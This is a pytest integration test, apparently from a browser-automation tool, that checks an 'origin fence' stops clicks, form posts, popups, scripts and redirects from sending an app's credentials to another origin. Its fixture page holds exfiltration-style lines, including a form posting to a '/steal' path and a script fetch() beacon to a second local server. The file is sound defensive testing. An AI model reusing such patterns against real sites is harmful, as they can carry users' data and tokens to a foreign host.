"""The origin fence: clicks, form posts, popups, scripts and redirects cannot take the app's credentials to
another origin. Two local servers: the app, and an 'elsewhere' origin that records every hit."""

from __future__ import annotations

import threading
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from sentri.runner.browser import BrowserManager
from sentri.runner.fence import fence_of, set_identity_headers

pytestmark = pytest.mark.integration


class Servers:
    def __init__(self) -> None:
        self.hits: list[tuple[str, str, str, str | None]] = []  # server, method, path, authorization
        self.app = ThreadingHTTPServer(("127.0.0.1", 0), self._handler("app"))
        self.other = ThreadingHTTPServer(("127.0.0.1", 0), self._handler("other"))
        for s in (self.app, self.other):
            threading.Thread(target=s.serve_forever, daemon=True).start()

    @property
    def app_url(self) -> str:
        return f"http://127.0.0.1:{self.app.server_address[1]}"

    @property
    def other_url(self) -> str:
        return f"http://127.0.0.1:{self.other.server_address[1]}"

    def other_hits(self) -> list[tuple[str, str, str, str | None]]:
        return [h for h in self.hits if h[0] == "other"]

    def _handler(self, name: str) -> type[BaseHTTPRequestHandler]:
        servers = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *_a: object) -> None:
                pass

            def _reply(self) -> None:
                servers.hits.append((name, self.command, self.path, self.headers.get("authorization")))
                other = servers.other_url
                if name == "app" and self.path.startswith("/redirect-out"):
                    self.send_response(302)
                    self.send_header("Location", f"{other}/landed")
                    self.end_headers()
                    return
                if name == "app" and self.path.startswith("/redirect-in"):
                    self.send_response(302)
                    self.send_header("Location", "/inside")
                    self.end_headers()
                    return
                body = b"ok"
                ctype = "text/plain"
                if name == "app" and self.path.startswith("/page"):
                    ctype = "text/html"
                    body = (
                        f'<form method="post" action="{other}/steal"><button id="post">go</button></form>'
                        f'<a id="link" href="{other}/link">x</a><a id="pop" target="_blank" href="{other}/pop">p</a>'
                        f'<img id="img" src="{other}/pixel.png">'
                        f"<script>fetch('{other}/beacon', {{method: 'POST', body: 'x'}}).catch(() => {{}});</script>"
                    ).encode()
                self.send_response(200)
                self.send_header("content-type", ctype)
                self.end_headers()
                self.wfile.write(body)

            do_GET = _reply
            do_POST = _reply

        return Handler

    def close(self) -> None:
        for s in (self.app, self.other):
            s.shutdown()


@pytest.fixture
def servers() -> Iterator[Servers]:
    s = Servers()
    try:
        yield s
    finally:
        s.close()


async def test_clicks_forms_popups_and_scripts_cannot_reach_another_origin(servers: Servers):
    async with BrowserManager() as browser:
        ctx = await browser.new_context(fence_origin=servers.app_url)
        page = await ctx.new_page()
        await page.goto(servers.app_url + "/page")
        await page.wait_for_timeout(300)
        for selector in ("#post", "#link", "#pop"):
            await page.goto(servers.app_url + "/page")
            await page.click(selector)
            await page.wait_for_timeout(300)
        fence = fence_of(ctx)
        assert fence is not None
    reached = {(m, p) for _s, m, p, _a in servers.other_hits()}
    assert reached <= {("GET", "/pixel.png")}, reached  # only the static image, allowed by default
    hows = {(b.how, b.url.rsplit("/", 1)[-1]) for b in fence.blocked}
    assert {("aborted", "steal"), ("aborted", "link"), ("aborted", "pop"), ("stubbed", "beacon")} <= hows


async def test_offsite_assets_can_be_blocked_too(servers: Servers):
    async with BrowserManager(offsite_assets="block") as browser:
        ctx = await browser.new_context(fence_origin=servers.app_url)
        page = await ctx.new_page()
        await page.goto(servers.app_url + "/page")
        await page.wait_for_timeout(300)
    assert servers.other_hits() == []


async def test_identity_tokens_stay_on_the_app_origin_even_through_redirects(servers: Servers):
    async with BrowserManager() as browser:
        ctx = await browser.new_context(fence_origin=servers.app_url)
        await set_identity_headers(ctx, {"Authorization": "Bearer secret-token"})
        page = await ctx.new_page()
        await page.goto(servers.app_url + "/page")
        await page.wait_for_timeout(300)
        await page.goto(servers.app_url + "/redirect-out")
        assert "origin fence" in await page.content()
        await page.goto(servers.app_url + "/redirect-in")
        assert page.url.endswith("/inside")
        status = await page.evaluate("fetch('/redirect-out').then(r => r.status)")
        assert status == 204
    assert all(auth is None for _s, _m, _p, auth in servers.other_hits())
    assert ("other", "GET", "/landed") not in {h[:3] for h in servers.hits}
    app_auth = {p: a for s, _m, p, a in servers.hits if s == "app"}
    assert app_auth["/page"] == "Bearer secret-token" and app_auth["/redirect-out"] == "Bearer secret-token"


async def test_unfenced_contexts_behave_as_before(servers: Servers):
    async with BrowserManager() as browser:
        ctx = await browser.new_context()  # no origin known: nothing blocked
        page = await ctx.new_page()
        await page.goto(servers.app_url + "/page")
        await page.click("#link")
        await page.wait_for_timeout(300)
    assert ("other", "GET", "/link") in {h[:3] for h in servers.hits}
